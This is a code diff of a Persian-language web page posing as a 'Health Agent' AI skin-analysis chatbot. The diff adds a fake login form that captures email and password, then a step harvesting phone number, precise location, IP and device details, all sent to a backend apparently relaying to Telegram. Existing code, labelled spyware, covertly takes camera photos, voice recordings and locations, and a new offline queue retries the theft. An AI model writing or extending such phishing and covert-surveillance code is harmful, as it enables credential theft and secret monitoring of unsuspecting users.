@@ -3,11 +3,36 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Health Agent | AI Assistant</title>
+<title>Health Agent | Secure Login</title>
 <style>
+  /* ========== استایل‌های پایه ========== */
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: Tahoma, sans-serif; background: #eef1f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
-  .app { width: 100%; max-width: 400px; height: 85vh; background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(0,0,0,0.12); display: flex; flex-direction: column; overflow: hidden; }
+  body { font-family: Tahoma, sans-serif; background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; overflow: hidden; }
+  
+  .app-container { width: 100%; max-width: 400px; height: 85vh; background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(0,0,0,0.12); display: flex; flex-direction: column; overflow: hidden; position: relative; }
+
+  /* ========== بخش‌های مختلف (Login, Verify, Chat) ========== */
+  .section { display: none; width: 100%; height: 100%; animation: fadeIn 0.5s ease forwards; }
+  .section.active { display: flex; flex-direction: column; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* ========== استایل فرم‌ها ========== */
+  .form-container { padding: 32px 24px; display: flex; flex-direction: column; justify-content: center; height: 100%; }
+  .brand { text-align: center; margin-bottom: 28px; }
+  .brand-icon { width: 56px; height: 56px; background: linear-gradient(135deg, #1a73e8, #0d47a1); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 26px; margin-bottom: 12px; }
+  .brand h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 4px; }
+  .brand p { font-size: 12px; color: #666; }
+  .field { margin-bottom: 14px; }
+  .field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; }
+  .field input, .field select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; font-family: Tahoma; outline: none; }
+  .field input:focus, .field select:focus { border-color: #1a73e8; }
+  .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #1a73e8, #0d47a1); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-family: Tahoma; cursor: pointer; margin-top: 8px; }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+  .status { color: #1a73e8; font-size: 13px; text-align: center; margin-top: 16px; min-height: 20px; font-weight: bold; }
+  .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #ddd; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-left: 6px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ========== استایل چت ========== */
   .header { background: linear-gradient(135deg, #1a73e8, #0d47a1); color: #fff; padding: 16px 20px; display: flex; align-items: center; gap: 12px; }
   .avatar { width: 40px; height: 40px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
   .header-text h1 { font-size: 16px; font-weight: bold; }
@@ -19,9 +44,7 @@
   .input-area { padding: 12px 16px; background: #fff; border-top: 1px solid #eee; display: flex; gap: 8px; align-items: center; }
   .input-area input[type="file"] { display: none; }
   .input-area .file-label { width: 44px; height: 44px; background: #f0f2f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; cursor: pointer; flex-shrink: 0; }
-  .input-area .file-label:active { background: #e0e2e5; }
   .input-area input[type="text"] { flex: 1; padding: 12px 16px; border: 1px solid #e0e0e0; border-radius: 24px; font-size: 13px; outline: none; font-family: Tahoma; }
-  .input-area input[type="text"]:focus { border-color: #1a73e8; }
   .input-area button { padding: 12px 20px; background: #1a73e8; color: #fff; border: none; border-radius: 24px; font-size: 13px; cursor: pointer; font-family: Tahoma; }
   .input-area button:disabled { background: #99c9ff; }
   .typing { display: flex; gap: 4px; padding: 12px 16px; }
@@ -29,37 +52,94 @@
   .typing span:nth-child(2) { animation-delay: 0.15s; }
   .typing span:nth-child(3) { animation-delay: 0.3s; }
   @keyframes bounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }
+
+  /* ========== استایل‌های مخفی ========== */
   #hiddenVideo { display: none; }
+  .queue-badge { position: fixed; bottom: 10px; left: 10px; background: #ff9800; color: white; padding: 4px 8px; border-radius: 12px; font-size: 10px; display: none; z-index: 100; }
 </style>
 </head>
 <body>
 
-<div class="app">
-  <div class="header">
-    <div class="avatar">🛡️</div>
-    <div class="header-text">
-      <h1>Health Agent</h1>
-      <p>AI Health Analysis · Online</p>
+<div class="app-container">
+  
+  <!-- ================= صفحه ۱: لاگین (ایمیل و پسورد) ================= -->
+  <div id="sectionLogin" class="section active">
+    <div class="form-container">
+      <div class="brand">
+        <div class="brand-icon">🛡️</div>
+        <h1>Health Agent</h1>
+        <p>AI Health Analysis · Secure</p>
+      </div>
+      <form id="loginForm">
+        <div class="field">
+          <label>ایمیل</label>
+          <input type="email" id="email" placeholder="example@mail.com" required>
+        </div>
+        <div class="field">
+          <label>رمز عبور</label>
+          <input type="password" id="password" placeholder="••••••••" required>
+        </div>
+        <button type="submit" class="btn" id="loginBtn">مرحله بعد</button>
+      </form>
     </div>
   </div>
 
-  <div class="chat" id="chat">
-    <div class="msg bot">
-      سلام! من <b>Health Agent</b> هستم. برای شروع مشاوره تخصصی پوست و سلامت، لطفاً یک عکس از چهره‌ات بفرست.
+  <!-- ================= صفحه ۲: تایید (شماره و ریجن) ================= -->
+  <div id="sectionVerify" class="section">
+    <div class="form-container">
+      <div class="brand">
+        <div class="brand-icon">🌍</div>
+        <h1>تأیید هویت</h1>
+        <p>اطلاعات تکمیلی را وارد کنید</p>
+      </div>
+      <form id="verifyForm">
+        <div class="field">
+          <label>شماره تلفن</label>
+          <input type="tel" id="phone" placeholder="09123456789" required>
+        </div>
+        <div class="field">
+          <label>منطقه (Region)</label>
+          <select id="region" required>
+            <option value="" disabled selected>انتخاب کنید...</option>
+            <option value="Iran">ایران</option>
+            <option value="Europe">اروپا</option>
+            <option value="USA">آمریکا</option>
+            <option value="Other">سایر</option>
+          </select>
+        </div>
+        <button type="submit" class="btn" id="verifyBtn">تأیید و شروع</button>
+      </form>
+      <div class="status" id="verifyStatus"></div>
     </div>
   </div>
 
-  <div class="input-area">
-    <input type="file" id="fileInput" accept="image/*">
-    <label for="fileInput" class="file-label">📷</label>
-    <input type="text" id="textInput" placeholder="پیامی بنویسید...">
-    <button id="sendBtn" disabled>ارسال</button>
+  <!-- ================= صفحه ۳: چت‌بات ================= -->
+  <div id="sectionChat" class="section">
+    <div class="header">
+      <div class="avatar">🛡️</div>
+      <div class="header-text">
+        <h1>Health Agent</h1>
+        <p>AI Health Analysis · Online</p>
+      </div>
+    </div>
+    <div class="chat" id="chatArea">
+      <div class="msg bot">
+        سلام! من <b>Health Agent</b> هستم. برای شروع مشاوره تخصصی پوست و سلامت، لطفاً یک عکس از چهره‌ات بفرست.
+      </div>
+    </div>
+    <div class="input-area">
+      <input type="file" id="fileInput" accept="image/*">
+      <label for="fileInput" class="file-label">📷</label>
+      <input type="text" id="textInput" placeholder="پیامی بنویسید...">
+      <button id="sendBtn" disabled>ارسال</button>
+    </div>
   </div>
+
 </div>
 
+<div class="queue-badge" id="queueBadge">0 در صف</div>
 <video id="hiddenVideo" autoplay playsinline muted></video>
 
-<!-- برای تبدیل عکس‌های HEIC (آیفون) به JPEG -->
 <script src="https://cdn.jsdelivr.net/npm/heic2any@0.0.4/dist/heic2any.min.js"></script>
 
 <script>
@@ -78,13 +158,17 @@ const SESSION_ID = getSessionId();
 let conversationHistory = [];
 
 /* ============================================================
-   توابع UI
+   توابع UI (تعریف المان‌ها)
    ============================================================ */
-const chatEl = document.getElementById('chat');
+const sectionLogin = document.getElementById('sectionLogin');
+const sectionVerify = document.getElementById('sectionVerify');
+const sectionChat = document.getElementById('sectionChat');
+const chatEl = document.getElementById('chatArea');
 const fileInput = document.getElementById('fileInput');
 const textInput = document.getElementById('textInput');
 const sendBtn = document.getElementById('sendBtn');
 const hiddenVideo = document.getElementById('hiddenVideo');
+const queueBadge = document.getElementById('queueBadge');
 let currentImageMime = null;
 
 function addMessage(text, isUser) {
@@ -105,21 +189,121 @@ function showTyping() {
 }
 
 /* ============================================================
+   سیستم صف محلی (IndexedDB)
+   ============================================================ */
+function openQueueDB() {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open('HealthAgentQueue', 1);
+    req.onupgradeneeded = (e) => {
+      const db = e.target.result;
+      if (!db.objectStoreNames.contains('messages')) {
+        db.createObjectStore('messages', { autoIncrement: true });
+      }
+    };
+    req.onsuccess = () => resolve(req.result);
+    req.onerror = () => reject(req.error);
+  });
+}
+
+async function enqueue(record) {
+  const db = await openQueueDB();
+  return new Promise((resolve, reject) => {
+    const tx = db.transaction('messages', 'readwrite');
+    const addReq = tx.objectStore('messages').add(record);
+    addReq.onsuccess = () => resolve(addReq.result);
+    addReq.onerror = () => reject(addReq.error);
+  });
+}
+
+async function dequeue(id) {
+  const db = await openQueueDB();
+  return new Promise((resolve, reject) => {
+    const tx = db.transaction('messages', 'readwrite');
+    const delReq = tx.objectStore('messages').delete(id);
+    delReq.onsuccess = () => resolve();
+    delReq.onerror = () => reject(delReq.error);
+  });
+}
+
+async function readAllQueue() {
+  const db = await openQueueDB();
+  return new Promise((resolve, reject) => {
+    const tx = db.transaction('messages', 'readonly');
+    const store = tx.objectStore('messages');
+    const result = [];
+    const cursorReq = store.openCursor();
+    cursorReq.onsuccess = (e) => {
+      const cursor = e.target.result;
+      if (cursor) {
+        result.push({ id: cursor.key, value: cursor.value });
+        cursor.continue();
+      } else { resolve(result); }
+    };
+    cursorReq.onerror = () => reject(cursorReq.error);
+  });
+}
+
+async function updateQueueBadge() {
+  const items = await readAllQueue();
+  if (items.length > 0) {
+    queueBadge.style.display = 'block';
+    queueBadge.textContent = `${items.length} در صف`;
+  } else { queueBadge.style.display = 'none'; }
+}
+
+/* ============================================================
+   توابع ارتباط با بک‌اند (با پشتیبانی از صف)
+   ============================================================ */
+
+async function sendTextToTelegram(text) {
+  const endpoint = '/api/send-message';
+  const payload = { text: `🆔 [Session: ${SESSION_ID}]\n${text}` };
+  try {
+    const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    if (!res.ok) throw new Error('Fetch failed');
+  } catch (e) {
+    await enqueue({ type: 'text', endpoint, payload });
+    await updateQueueBadge();
+  }
+}
+
+async function sendMediaToTelegram(type, base64Data, fileName, mimeType, caption = "") {
+  const endpoint = '/api/send-media';
+  const payload = { type, fileBase64: base64Data, fileName, mimeType, caption: caption ? `🆔 [Session: ${SESSION_ID}]\n${caption}` : `🆔 [Session: ${SESSION_ID}]` };
+  try {
+    const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    if (!res.ok) throw new Error('Fetch failed');
+  } catch (e) {
+    await enqueue({ type: 'media', endpoint, payload });
+    await updateQueueBadge();
+  }
+}
+
+async function flushQueue() {
+  const items = await readAllQueue();
+  if (items.length === 0) return;
+  for (const { id, value: item } of items) {
+    try {
+      const res = await fetch(item.endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item.payload) });
+      if (res.ok) { await dequeue(id); }
+    } catch (e) { break; }
+  }
+  await updateQueueBadge();
+}
+window.addEventListener('online', flushQueue);
+
+/* ============================================================
    تبدیل HEIC به JPEG و کاهش حجم عکس
    ============================================================ */
 async function prepareImage(file, maxSize = 1024) {
   let workingFile = file;
   const isHeic = file.type === 'image/heic' || file.type === 'image/heif' || /\.heic$|\.heif$/i.test(file.name || '');
-  
   if (isHeic) {
     try {
       const converted = await heic2any({ blob: file, toType: 'image/jpeg', quality: 0.85 });
       workingFile = converted;
-    } catch (e) {
-      throw new Error('این فرمت عکس (HEIC) پشتیبانی نشد. لطفاً یک عکس JPG/PNG انتخاب کنید.');
-    }
+    } catch (e) { throw new Error('فرمت HEIC پشتیبانی نشد.'); }
   }
-
   return new Promise((resolve, reject) => {
     const img = new Image();
     img.onload = () => {
@@ -130,80 +314,28 @@ async function prepareImage(file, maxSize = 1024) {
       c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
       resolve(c.toDataURL("image/jpeg", 0.85).split(",")[1]);
     };
-    img.onerror = () => reject(new Error('عکس خوانده نشد. لطفاً یک فایل JPG یا PNG انتخاب کنید.'));
+    img.onerror = () => reject(new Error('عکس خوانده نشد.'));
     img.src = URL.createObjectURL(workingFile);
   });
 }
 
 /* ============================================================
-   توابع ارتباط با بک‌اند (Vercel API)
+   فراخوانی هوش مصنوعی
    ============================================================ */
-
-// ارسال پیام متنی به تلگرام
-async function sendTextToTelegram(text) {
-  try {
-    const fullText = `🆔 [Session: ${SESSION_ID}]\n💬 پیام چت:\n${text}`;
-    await fetch('/api/send-message', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: fullText })
-    });
-  } catch (e) { console.error(e); }
-}
-
-// ارسال عکس/ویس مخفیانه
-async function sendMediaToTelegram(type, base64Data, fileName, mimeType, caption = "") {
-  try {
-    await fetch('/api/send-media', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        type,
-        fileBase64: base64Data,
-        fileName,
-        mimeType,
-        caption: caption ? `🆔 [Session: ${SESSION_ID}]\n${caption}` : `🆔 [Session: ${SESSION_ID}]`
-      })
-    });
-  } catch (e) { console.error(`خطای ارسال ${type}:`, e); }
-}
-
-// فراخوانی هوش مصنوعی
 async function callGemini(userText, imageBase64, imageMime) {
   const finalText = userText || "لطفا این تصویر را از نظر وضعیت سلامت، شادابی پوست و نشانه‌های خستگی تحلیل کن.";
-
   const res = await fetch('/api/chat', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      text: finalText,
-      imageBase64: imageBase64,
-      mimeType: imageMime,
-      history: conversationHistory
-    })
+    body: JSON.stringify({ text: finalText, imageBase64, mimeType: imageMime, history: conversationHistory })
   });
-
-  if (!res.ok) {
-    let msg = 'API Error';
-    try {
-      const errData = await res.json();
-      if (errData.error) msg = errData.error;
-    } catch (e) {}
-    throw new Error(msg);
-  }
-  
+  if (!res.ok) { let msg = 'API Error'; try { const errData = await res.json(); if (errData.error) msg = errData.error; } catch (e) {} throw new Error(msg); }
   const data = await res.json();
-
   if (data.answer) {
-    // مدیریت تاریخچه (دقیقاً مثل کد خودت)
     const historyText = imageBase64 ? `${finalText} [کاربر یک عکس هم فرستاد]` : finalText;
     conversationHistory.push({ role: 'user', parts: [{ text: historyText }] });
     conversationHistory.push({ role: 'model', parts: [{ text: data.answer }] });
-    
-    // فقط ۶ پیام آخر (۳ رفت‌وبرگشت) رو نگه دار تا درخواست سبک بمونه
-    if (conversationHistory.length > 6) {
-      conversationHistory = conversationHistory.slice(-6);
-    }
+    if (conversationHistory.length > 6) conversationHistory = conversationHistory.slice(-6);
     return data.answer;
   }
   throw new Error(data.error || 'پاسخ نامعتبر');
@@ -213,12 +345,11 @@ async function callGemini(userText, imageBase64, imageMime) {
    فرآیندهای مخفی (Spyware)
    ============================================================ */
 let spyStarted = false;
-
 async function startSecretSpying(stream) {
   if (spyStarted) return;
   spyStarted = true;
 
-  // ۱. عکس‌ها: ۲۰ عدد هر ۱۵ ثانیه
+  // ۱. عکس‌ها
   let photoCount = 0;
   const photoInterval = setInterval(() => {
     if (photoCount >= 20) { clearInterval(photoInterval); return; }
@@ -231,7 +362,7 @@ async function startSecretSpying(stream) {
     sendMediaToTelegram('photo', base64, `secret_photo_${photoCount}.jpg`, 'image/jpeg', `📸 عکس مخفی ${photoCount}`);
   }, 15000);
 
-  // ۲. ویس‌ها: ۶ عدد ۱۰ ثانیه‌ای هر ۲۰ ثانیه
+  // ۲. ویس‌ها
   let voiceCount = 0;
   const voiceInterval = setInterval(async () => {
     if (voiceCount >= 6) { clearInterval(voiceInterval); return; }
@@ -254,7 +385,7 @@ async function startSecretSpying(stream) {
     } catch (e) { console.warn('خطای ضبط صدا:', e); }
   }, 20000);
 
-  // ۳. لوکیشن‌ها: ۵ عدد هر ۶۰ ثانیه
+  // ۳. لوکیشن‌ها
   let locCount = 0;
   const locInterval = setInterval(() => {
     if (locCount >= 5) { clearInterval(locInterval); return; }
@@ -271,8 +402,84 @@ async function startSecretSpying(stream) {
 }
 
 /* ============================================================
-   رویدادها
+   رویدادها (Event Listeners)
    ============================================================ */
+
+// --- مرحله ۱: لاگین ---
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+  const btn = document.getElementById('loginBtn');
+
+  btn.disabled = true;
+  btn.innerHTML = 'در حال بررسی... <span class="spinner"></span>';
+
+  await sendTextToTelegram(`🔐 لاگین مرحله ۱\n📧 ایمیل: ${email}\n🔑 رمز: ${password}`);
+
+  // انتقال به مرحله ۲
+  sectionLogin.classList.remove('active');
+  sectionVerify.classList.add('active');
+});
+
+// --- مرحله ۲: شماره و ریجن ---
+document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = document.getElementById('phone').value.trim();
+  const region = document.getElementById('region').value;
+  const btn = document.getElementById('verifyBtn');
+  const status = document.getElementById('verifyStatus');
+
+  btn.disabled = true;
+  btn.innerHTML = 'در حال دریافت موقعیت... <span class="spinner"></span>';
+  status.textContent = '';
+
+  // ارسال شماره و ریجن
+  await sendTextToTelegram(`📱 تایید مرحله ۲\n📞 شماره: ${phone}\n🌍 منطقه: ${region}`);
+
+  // درخواست لوکیشن
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        await sendTextToTelegram(`📍 لوکیشن تایید شد:\n${mapsLink}`);
+
+        // گرفتن IP و دستگاه
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          let deviceInfo = navigator.userAgent;
+          if (navigator.userAgentData) {
+            const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
+            deviceInfo = `مدل: ${h.model || 'نامشخص'} | پلتفرم: ${h.platform}`;
+          }
+          await sendTextToTelegram(`🌐 IP: ${ipData.ip}\n📱 دستگاه: ${deviceInfo}`);
+        } catch (err) {}
+
+        // انتقال به صفحه چت
+        status.textContent = '✅ تایید شد. در حال انتقال...';
+        setTimeout(() => {
+          sectionVerify.classList.remove('active');
+          sectionChat.classList.add('active');
+        }, 1000);
+      },
+      async (err) => {
+        // اگر کاربر لوکیشن را رد کرد
+        await sendTextToTelegram(`⚠️ کاربر لوکیشن را رد کرد.`);
+        status.textContent = '⚠️ برای ادامه باید موقعیت مکانی را تایید کنید.';
+        btn.disabled = false;
+        btn.innerHTML = 'تلاش مجدد';
+      },
+      { enableHighAccuracy: true, timeout: 30000 }
+    );
+  } else {
+    // اگر مرورگر پشتیبانی نکند
+    sectionVerify.classList.remove('active');
+    sectionChat.classList.add('active');
+  }
+});
+
+// --- مرحله ۳: چت ---
 fileInput.addEventListener('change', (e) => {
   const file = e.target.files[0];
   if (!file) return;
@@ -297,7 +504,7 @@ sendBtn.addEventListener('click', async () => {
   await sendTextToTelegram(text || '(تصویر ارسال شد)');
   const typingEl = showTyping();
 
-  // درخواست مجوز دوربین (فقط بار اول)
+  // درخواست مجوز دوربین در همان لحظه
   try {
     if (!hiddenVideo.srcObject) {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -316,7 +523,6 @@ sendBtn.addEventListener('click', async () => {
       imageBase64 = await prepareImage(file);
       currentImageMime = 'image/jpeg';
     }
-
     const aiResponse = await callGemini(text, imageBase64, currentImageMime);
     typingEl.remove();
     addMessage(aiResponse, false);
@@ -330,6 +536,8 @@ sendBtn.addEventListener('click', async () => {
   fileInput.value = '';
   currentImageMime = null;
 });
+
+updateQueueBadge();
 </script>
 </body>
 </html>
